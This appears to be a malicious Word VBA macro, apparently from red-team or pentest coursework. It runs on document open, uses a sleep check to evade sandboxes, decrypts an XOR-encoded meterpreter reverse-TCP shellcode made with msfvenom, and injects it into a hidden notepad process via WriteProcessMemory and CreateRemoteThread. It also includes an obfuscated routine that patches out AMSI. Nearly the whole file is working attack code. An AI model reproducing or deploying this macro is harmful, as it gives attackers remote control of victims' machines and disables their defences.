Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function mymacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    Dim Is64 As Boolean
    Dim StrFile As String
    
    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If

    Dim sc As Variant
    Dim key As String
    ' TODO change the key
    key = "0xfa"

    'msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f vbapplication --encrypt xor --encrypt-key '0xfa'
    sc = Array(204, 144, 233, 97, 48, 120, 6, 80, 226, 28, 237, 51, 0, 241, 131, 234, 98, 116, 237, 51, 36, 243, 20, 73, 1, 135, 105, 214, 122, 94, 87, 161, 156, 68, 7, 29, 50, 84, 70, 160, 255, 117, 103, 166, 121, 13, 137, 51, 103, 243, 52, 113, 187, 58, 90, 96, 224, 243, 38, 25, 181, 184, 18, 45, 49, 168, 54, 234, 120, 96, 237, 57, 16, 121, 181, 228, 249, 12, 90, 40, 187, _
76, 237, 96, 230, 73, 153, 80, 240, 212, 167, 174, 61, 121, 161, 89, 208, 13, 146, 98, 77, 128, 93, 28, 20, 13, 134, 57, 187, 32, 66, 96, 227, 30, 237, 109, 123, 243, 62, 125, 49, 171, 237, 101, 187, 121, 182, 232, 116, 92, 66, 58, 107, 25, 63, 59, 97, 135, 134, 57, 111, 34, 237, 115, 217, 248, 153, 158, 207, 37, 14, 82, 2, 120, 102, 9, 71, 11, 84, 62, 100, _
16, 42, 22, 22, 127, 239, 137, 207, 168, 222, 241, 49, 120, 102, 72, 244, 44, 54, 9, 25, 248, 13, 97, 207, 173, 12, 107, 88, 184, 206, 76, 239, 16, 100, 97, 49, 195, 239, 135, 96, 40, 54, 49, 112, 40, 38, 49, 88, 146, 105, 190, 208, 135, 179, 246, 90, 104, 48, 54, 88, 225, 195, 21, 81, 135, 179, 228, 240, 12, 108, 158, 126, 112, 19, 141, 216, 31, 102, 97, 48, _
18, 102, 11, 52, 46, 49, 9, 50, 161, 174, 62, 207, 173, 229, 153, 48, 6, 80, 234, 6, 18, 38, 9, 48, 104, 102, 97, 102, 18, 102, 9, 104, 220, 53, 132, 207, 173, 245, 50, 90, 120, 48, 50, 103, 16, 100, 184, 248, 39, 153, 180, 179, 128, 102, 28, 24, 32, 14, 97, 112, 120, 102, 11, 48, 40, 14, 106, 31, 119, 86, 158, 229, 47, 14, 20, 94, 53, 7, 158, 229, _
38, 56, 158, 60, 92, 105, 228, 64, 135, 153, 158, 217, 227, 153, 158, 207, 121, 165, 72, 246, 13, 167, 162, 139, 152, 123, 75, 58, 16, 192, 244, 141, 229, 153, 180, 12, 126, 26, 107, 176, 131, 134, 20, 53, 195, 33, 114, 66, 23, 12, 97, 99, 135, 179)

    Dim scSize As Long
    scSize = UBound(sc)
    ' Decrypt shellcode
    Dim keyArrayTemp() As Byte
    keyArrayTemp = key
    
    i = 0
    For x = 0 To UBound(sc)
        sc(x) = sc(x) Xor keyArrayTemp(i)
        i = (i + 2) Mod (Len(key) * 2)
    Next x
    
    ' TODO set the SIZE here (use a size > to the shellcode size)
    Dim buf(685) As Byte
    For y = 0 To UBound(sc)
        buf(y) = sc(y)
    Next y

    'grab handle to target, which has to be running if this macro is opened from word
    Shell "notepad.exe", vbHide
    pid = getPID("notepad.exe")
    Handle = OpenProcess(&H1F0FFF, False, pid)
    
    'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    'byte-by-byte to attempt sneaking our shellcode past AV hooks
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function
Sub patch(StrFile As String, Is64 As Boolean)
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    lib = getmod(StrFile)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub
Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)
    For Each Process In objProcessSet
        getPID = Process.processID
    Next
End Function
Sub test()
    mymacro
End Sub
Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub
